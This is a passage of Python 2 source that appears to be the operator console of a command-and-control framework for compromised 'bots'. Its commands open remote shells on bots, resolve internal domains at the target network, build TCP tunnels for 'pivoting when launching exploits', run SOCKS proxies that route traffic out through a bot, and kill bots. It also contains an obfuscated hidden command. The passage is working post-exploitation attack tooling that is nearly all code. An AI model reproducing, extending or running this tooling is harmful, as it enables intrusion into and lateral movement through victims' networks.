        sleep(0.1)      # wait for the reconnection
        print Fore.YELLOW + "/-------------------------------------------------\\" + Style.RESET_ALL
        print Fore.YELLOW + "| Entering remote shell. Use " + Style.BRIGHT + "Control+C" + Style.NORMAL + " to return. |" + Style.RESET_ALL
        print Fore.YELLOW + "\\-------------------------------------------------/" + Style.RESET_ALL
        shell = RemoteShell(sock)
        shell.run_parent()
        print

        # Try to re-select the same bot when exiting the shell.
        # We need to do this because the shell command reuses the C&C socket,
        # so the bot mut reconnect in the background with a new socket.
        self.current = self.listener.bots.get(uuid, None)

    def do_dig(self, line):
        """
    \x1b[32m\x1b[1mdig\x1b[0m <\x1b[34m\x1b[1mdomain name\x1b[0m>

    Resolve a domain name at the bot.
    This is useful for resolving local domains at the target network.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            domain, = split(line, comments=True)
            assert domain
        except Exception:
            self.onecmd("help dig")
            return

        # Perform the operation.
        answer = self.current.dns_resolve(domain)

        # Show the results.
        for addr in answer:
            print addr

    def do_pivot(self, line):
        """
    \x1b[32m\x1b[1mpivot\x1b[0m <\x1b[34m\x1b[1mlisten on port\x1b[0m> <\x1b[34m\x1b[1mconnect to IP address\x1b[0m> <\x1b[34m\x1b[1mconnect to port\x1b[0m>

    Create a one shot TCP tunnel. Useful for pivoting when launching exploits.
    This tunnel will only be available to localhost and the port is closed
    once a client has connected.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Make sure the bot is still alive.
        # This is inaccurate and strictly speaking unneeded,
        # but it helps a bit since we're about to launch
        # multiple threads and all that stuff, and we may
        # want to skip it for obviously wrong scenarios.
        assert self.current.alive

        # Parse the arguments, on error show help.
        try:
            listen, address, port = split(line, comments=True)
        except Exception:
            self.onecmd("help pivot")
            return

        # Remember the UUID of the bot. We will need this later.
        uuid = self.current.uuid

        # Listen on the requested port and wait for a single connection.
        listen  = int(listen)
        port    = int(port)
        address = gethostbyname(address)
        listen_sock = socket()
        listen_sock.bind( ("127.0.0.1", listen) )
        listen_sock.listen(1)
        print "Connect to port %d now..." % listen
        accept_sock = listen_sock.accept()[0]
        try:

            # We got our connection, so we can stop listening.
            listen_sock.shutdown(2)
            listen_sock.close()

            # Connect to the target IP and port using the bot as a pivot.
            # This reuses the current C&C socket so we won't be able to
            # issue any more commands over it again. The bot will reconnect
            # automatically in the background, however.
            connect_sock = self.current.tcp_pivot(address, port)
            try:
                try:

                    # Fire up the TCP bouncers, one for each direction.
                    # That way we get a realtime duplex channel.
                    # Reading and writing sequentially would be a mistake,
                    # since we cannot be sure of the order in which that
                    # will happen, and we could deadlock.
                    bouncer_1 = TCPForward(connect_sock, accept_sock)
                    bouncer_2 = TCPForward(accept_sock, connect_sock)
                    bouncer_1.start()
                    bouncer_2.start()

                    # Nobody uses this, but we need it somewhere so the
                    # garbage collector doesn't destroy our objects.
                    # TODO review if this is actually true...
                    self.current.bouncers = (bouncer_1, bouncer_2)

                finally:

                    # Try to re-select the same bot when exiting the shell.
                    # We need to do this because the pivot reuses the C&C socket,
                    # so the bot mut reconnect in the background with a new socket.
                    sleep(0.1)
                    self.current = self.listener.bots.get(uuid, None)

            # Just cleanup and error handling below.
            except:
                try:
                    connect_sock.shutdown(2)
                except:
                    pass
                try:
                    connect_sock.close()
                except:
                    pass
                raise
        except:
            try:
                accept_sock.shutdown(2)
            except:
                pass
            try:
                accept_sock.close()
            except:
                pass
            raise

    def do_proxy(self, line):
        """
    \x1b[32m\x1b[1mproxy\x1b[0m [\x1b[33m\x1b[1mls\x1b[0m]
    \x1b[32m\x1b[1mproxy\x1b[0m [\x1b[33m\x1b[1madd\x1b[0m] <\x1b[34m\x1b[1mport\x1b[0m> [\x1b[34m\x1b[1mbind address\x1b[0m] [\x1b[34m\x1b[1musername\x1b[0m] [\x1b[34m\x1b[1mpassword\x1b[0m]
    \x1b[32m\x1b[1mproxy\x1b[0m \x1b[33m\x1b[1mrm\x1b[0m <\x1b[34m\x1b[1mport\x1b[0m>

    Opens a SOCKS proxy on the given local port.
    Proxied connections will come out from the bot.

    Subcommands are:
        \x1b[33m\x1b[1mls\x1b[0m      Lists the currently active proxies
        \x1b[33m\x1b[1madd\x1b[0m     Adds a new proxy
        \x1b[33m\x1b[1mrm\x1b[0m      Removes an active proxy

    Arguments are:
        \x1b[33m\x1b[1mbind address\x1b[0m  Address to bind to (default: \x1b[34m\x1b[1m127.0.0.1\x1b[0m)
        \x1b[33m\x1b[1mport\x1b[0m          Port to listen on, also identifies the proxy
        \x1b[33m\x1b[1musername\x1b[0m      Optional username (if set, password must set too)
        \x1b[33m\x1b[1mpassword\x1b[0m      Optional password\n"""

        # This command has a tricky syntax with various subcommands.
        # They are listed below, along with helpful aliases.
        valid_commands = {
            "a": "add",
            "r": "rm",
            "l": "ls",
        }

        # Parse the command arguments.
        try:
            args = list(split(line, comments=True))

            # Trivial case (no arguments at all).
            # This is the same as the "ls" subcommand.
            if not args:
                command = "ls"
                port = None
            else:

                # Next easy case: no subcommand, just a port number.
                # That is shorthand for the "add" subcommand.
                # To make the logic easier we will just insert it.
                try:
                    int(args[0])
                    args.insert(0, "add")
                except ValueError:
                    pass

                # Get the subcommand.
                # If an alias has been used, convert it to the full name.
                command = args.pop(0)
                command = valid_commands.get(command, command)
                assert command in valid_commands.values()

                # Parse the "add" subcommand arguments.
                if command == "add":
                    port = int(args.pop(0))
                    assert 0 < port < 65536
                    if args:
                        bind_addr = args.pop(0)
                        bind_addr = inet_ntoa(inet_aton(bind_addr))
                        if args:
                            username = args.pop(0)
                            password = args.pop(0)  # must be used together
                            assert not args
                        else:
                            username = ""
                            password = ""
                    else:
                        bind_addr = "127.0.0.1"
                        username = ""
                        password = ""

                # Parse the "rm" subcommand arguments.
                elif command == "rm":
                    port = int(args.pop(0))
                    assert 0 < port < 65536
                    assert not args

                # Parse the "ls" subcommand arguments.
                elif command == "ls":
                    assert not args

                # Should never reach here.
                else:
                    raise AssertionError()

        # On error show a help message.
        except Exception:
            #print_exc()     # XXX DEBUG
            self.onecmd("help proxy")
            return

        # Execute the "add" subcommand.
        if command == "add":

            # A bot must be selected.
            if self.current is None:
                print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
                return

            # The bot must not be busy.
            if self.is_bot_busy():
                print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
                return

            # The port must be free.
            if port in self.proxies:
                print Fore.YELLOW + "Error: port is already in use" + Style.RESET_ALL
                return

            # Automatically fork the bot so we can keep using it.
            uuid = self.current.system_fork()

            # Create the SOCKSProxy.
            proxy = SOCKSProxy(self.listener, self.current.uuid, bind_addr, port, username, password)

            # Add it to the dictionary.
            self.proxies[port] = proxy

            # Launch the proxy.
            proxy.start()

            # With any luck the fork of the bot has already connected.
            # Try selecting it if we can. If we can't at least deselect it.
            sleep(0.1)
            self.current = self.listener.bots.get(uuid, None)

        # Execute the "rm" subcommand.
        elif command == "rm":

            # If there is no proxy at that port, complain.
            if port not in self.proxies:
                print Fore.YELLOW + ("No proxy on port %d" % port) + Style.RESET_ALL
                return

            # Remove the proxy from the dictionary and kill it.
            self.proxies.pop(port).kill()

        # Execute the "ls" subcommand.
        elif command == "ls":

            # If we had no active proxies, just show an error message.
            if not self.proxies:
                print Fore.YELLOW + "No active proxies right now" + Style.RESET_ALL
                print "(Use 'help proxy' to show the help)"
                return

            # We will show the list of proxies in an ASCII art table.
            # Same logic as the list of bots.
            table = Texttable()
            table.set_deco(Texttable.HEADER)
            table.set_cols_dtype(("i", "t", "t", "t", "t", "t"))
            table.set_cols_align(("l", "c", "c", "c", "c", "c"))
            table.set_cols_valign(("t", "t", "t", "t", "t", "t"))
            table.set_cols_width((len(str(len(self.proxies))), 36, 15+2, 5+2, 15+1, 4+2))
            table.add_rows((("#", "UUID", "Outgoing IP", "Port", "Bind IP", "Auth"),), header = True)
            i = 0
            for port, proxy in self.proxies.items():
                i += 1
                uuid = proxy.uuid
                bot = self.listener.bots[uuid]
                index = self.listener.bots.keys().index(uuid)
                table.add_row((
                    index,
                    uuid,
                    "\x02" + bot.from_addr[0] + "\x04",
                    ("\x03" if proxy.alive else "\x01") + str(port) + "\x04",
                    "\x04" + proxy.bind_addr,
                    ("\x03yes\x04" if proxy.username and proxy.password else "\x01no\x04"),
                ))
            text = table.draw()
            text = text.replace("\x01", " " + Fore.RED + Style.BRIGHT)
            text = text.replace("\x02", " " + Fore.BLUE + Style.BRIGHT)
            text = text.replace("\x03", " " + Fore.GREEN + Style.BRIGHT)
            text = text.replace("\x04", Style.RESET_ALL + " ")
            print
            print text
            print

        # Should never reach here.
        else:
            raise AssertionError()

    def do_kill(self, line):
        """
    \x1b[32m\x1b[1mkill\x1b[0m

    Kill the currently selected bot.
    This command takes no arguments.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            assert not split(line, comments=True)
        except Exception:
            raise
            self.onecmd("help kill")
            return

        # Kill the currently selected bot.
        # If the bot refuses to die (they can do that, yes)
        # an exception will be raised at this point.
        self.current.system_exit()

        # Deselect the bot, since we know it's dead now.
        self.current = None

    # Scary stuff below! :o)
    if "play" in globals():
        darknet = "tor"
        filename = "malna.png"
        bitcoins = 13
        secret = "".join([x[1:].encode(darknet[::-1]+str(bitcoins)) for x in os.path.splitext(filename)])
        del darknet
        del filename
        del bitcoins
        def get_names(self):
            secret = "do_" + Console.secret
            names = Cmd.get_names(self)
            if secret in names:
                names.remove(secret)
            return names

# Dunno about you reversing it but I had fun coding this :D
if "play" in globals():
    setattr(Console, "do_" + Console.secret, play)

##############################################################################
# The bit that launches the console itself.

# Main function. Assumes colorama has been initialized elsewhere.
def main(args = None):

    # If no arguments are given, use the system ones.
    if args is None:
        args = sys.argv[1:]

    # Load the interactive console.
    with Console(args) as c:

        # Show the intro banner but only the first time.
        skip_intro = False

        # We need to put this in a loop because the base class
        # provided by Python is a bit silly and just dies whenever a
        # command raises an exception, we obviously don't want that.
        while True:
            try:

                # Run the command loop, showing the banner only once.
                if skip_intro:
                    c.cmdloop(intro = "")
                else:
                    c.cmdloop()

                # If we got here that means the exit command was used.
                break

            # Show bot errors in a pretty way.
            except BotError, e:
                print Fore.RED + Style.BRIGHT + str(e) + Style.RESET_ALL

            # Quit silently with Control+C.
            except KeyboardInterrupt:
                print
                break

            # Show all other exceptions as Python tracebacks.
            # Ugly, but easier to debug. You'll thank me.
            except Exception:
                print_exc()

            # If we got here this is not the first time so skip the banner.
            skip_intro = True

if __name__ == "__main__":
    main()      # colorama already initialized when imported
    deinit()    # cleanup colorama
